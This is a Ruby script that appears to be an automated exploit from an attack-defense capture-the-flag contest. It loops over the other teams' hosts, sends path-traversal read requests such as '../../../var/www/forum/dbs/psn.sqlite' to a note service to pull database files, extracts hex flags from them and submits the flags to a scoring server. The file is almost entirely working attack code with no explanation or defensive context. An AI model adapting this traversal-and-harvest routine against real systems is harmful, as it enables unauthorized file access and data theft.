#!/usr/bin/env ruby
require 'socket'
require 'timeout'

STDOUT.sync = true

host = ARGV.first || '10.11.77.2'

def sgets s
  r=''
  while true
    c = s.read(1)
    r << c
    break if c == "\n" || c == ">"
  end
  r
end

def read_key host,key,socket
  fname = File.join('data',host,key) + ".dat"
  if File.exist?(fname)
    File.read(fname)
  else
    socket.write "read: #{key}\x0d\x0a"
    socket.flush
    t = socket.gets.to_s.strip.gsub('main>','')
    puts t
    Dir.mkdir(File.join('data',host)) rescue nil
    File.open(fname,'w'){ |f| f<<t }
    t
  end
end

def get_flags host
  s = nil
  Timeout.timeout(5) do
    s = TCPSocket.new host,1234
  end
  s.gets
  s.gets
  s.gets
  #s.write "read: e4c918f4ed\x0d\x0a"
  s.write "list\x0d\x0a"
  s.flush

  a = []

  sgets(s)

  while t=sgets(s)
    t = t.to_s.strip
    break if t == "main>"
    if t =~ /^[0-9a-z]{5,20}$/
      a << t
    end
  end
  puts "[*] #{a.size} notes"

  flags = []

  s.write "read: ../../mmd/mmd.db\x0d\x0a"
  s.flush
  db = ''
  begin
    Timeout.timeout(5) do
      while t=s.gets
        db<<t
      end
    end
  rescue Timeout::Error
  end

  if db.size > 10
    tmpdb = "tmp.#$$"
    File.open(tmpdb,'w'){ |f| f<<db }
    flags = `strings #{tmpdb}`.split("\n").map do |line|
      line.strip!
      line = line[7..-1] if line.size == 47
      line
    end.delete_if{ |x| x.size != 40 || x[/[^a-f0-9]/] }.uniq
    #flags = db.scan(/[0-9a-f]{40}/).uniq
    puts "[*] got #{flags.size} flags from db"
    File.unlink(tmpdb)
  end

##################
  s.write "read: ../../../var/www/forum/dbs/psn.sqlite\x0d\x0a"
  s.flush
  db = ''
  begin
    Timeout.timeout(5) do
      while t=s.gets
        db<<t
      end
    end
  rescue Timeout::Error
  end

  if db.size > 10
    tmpdb = "tmp.#$$"
    File.open(tmpdb,'w'){ |f| f<<db }
    flags2 = `strings #{tmpdb}`.split("\n").map do |line|
      line.force_encoding('binary')
      line.strip!
      line.gsub!('/X^w','')
      line = line[7..-1] if line.size == 47
      line
    end.delete_if{ |x| x.size != 40 || x[/[^a-f0-9]/] }.uniq
    #flags = db.scan(/[0-9a-f]{40}/).uniq
    puts "[*] got #{flags2.size} flags from db2"
    File.unlink(tmpdb)
    flags += flags2
    flags.uniq!
  end
################

  a.each do |key|
    flag = read_key(host,key,s)
    flag.force_encoding 'binary'
    flags << flag if flag =~ /[0-9a-z]{40}/
  end
  flags
end

@queue = {}

FINAL_RESPONSES = [
  "Unknown flag.",
  "Flag validity expired.",
  "You already submitted this flag.",
  "Congratulations, you scored a point!"
]

def known_flag?(flag)
  return true if flag.to_s.strip[/[^a-z0-9]/i]
  File.exist?("flags/#{flag}")
end

def save_flag flag, data
  File.open("flags/#{flag}","w"){ |f| f<<data }
end

def submit_flag flag
  unless @socket
    @socket = TCPSocket.open('10.11.0.1',1)
    @socket.gets
  end
  @socket.puts flag
  @socket.flush
  r = @socket.gets.to_s.strip
  if FINAL_RESPONSES.include?(r)
    puts r
    save_flag(flag,r)
    @queue.delete(flag)
  elsif r.empty?
    print "?"
    @socket = nil
    return false
  elsif r == "You do not have the corresponding service up (must be in state 'good')."
    @queue[flag] = 1
    puts "QUEUED: #{r}"
  else
    puts r
  end
  true
rescue
  @socket = nil
  p $!
  false
end

def submit_flags flags
  flags.each do |flag|
    next if known_flag?(flag)
    print "#{flag} .. "
    while true
      r = false
      begin
        Timeout::timeout(5) do
          r = submit_flag(flag)
        end
      rescue Timeout::Error
        print "t"
      end
      break if r
    end
  end
end

hosts = ARGV.map{ |x| x.count('.') == 3 ? x : "10.11.#{x}.2" }
if hosts.empty?
  a = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78]
  hosts = a.map{ |x| "10.11.#{x}.2" }.shuffle
end

OUR_HOST = '10.11.77.2'

while true do
  hosts.each do |host|
    next if host == OUR_HOST
    print "[.] #{host} .. "
    flags = []
    begin
      Timeout::timeout(360) do
        flags = get_flags host
      end
    rescue Timeout::Error
      STDERR.puts $!.inspect
    end
    if flags.any?
      submit_flags(flags)
    elsif @queue.any?
      submit_flags(@queue.keys)
    end
  end
end
